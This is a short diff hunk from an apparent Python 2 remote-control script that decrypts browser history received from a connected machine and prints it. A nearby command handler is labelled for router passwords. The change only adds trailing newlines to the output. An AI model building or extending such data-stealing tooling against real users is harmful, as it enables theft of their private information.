@@ -497,7 +497,7 @@ while True:
 
                 ebrowser_history = recv_one_message(conn)
                 browser_history = AES256.decrypt(ebrowser_history, d_key15)
-                print "\n\n" + browser_history
+                print "\n\n" + browser_history + "\n\n"
 
             # 'router_passowrd'
             elif int(float(command)) == 2083072854:
